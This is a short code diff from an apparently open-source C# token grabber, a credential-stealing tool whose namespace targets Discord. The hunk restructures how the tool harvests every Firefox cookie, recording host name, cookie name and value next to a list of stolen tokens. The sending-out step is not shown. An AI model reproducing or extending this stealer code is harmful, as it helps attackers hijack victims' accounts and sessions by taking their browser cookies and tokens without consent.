@@ -312,21 +312,18 @@ namespace Qvoid_Token_Grabber.Discord
                     catch { }
                 }
 
-                if (FireFox.CookiesExists())
+                try
                 {
-                    try
+                    foreach (var item in FireFox.GetAllCookies())
                     {
-                        foreach (var item in FireFox.GetAllCookies())
-                        {
-                            Cookies += $"{Environment.NewLine}Browser   : FireFox";
-                            Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
-                            Cookies += $"{Environment.NewLine}Name      : {item.Name}";
-                            Cookies += $"{Environment.NewLine}Value     : {item.Value}";
-                            Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
-                        }
+                        Cookies += $"{Environment.NewLine}Browser   : FireFox";
+                        Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
+                        Cookies += $"{Environment.NewLine}Name      : {item.Name}";
+                        Cookies += $"{Environment.NewLine}Value     : {item.Value}";
+                        Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
                     }
-                    catch { }
                 }
+                catch { }
 
                 for (int i = 0; i < Tokens.Count; ++i)
                 {
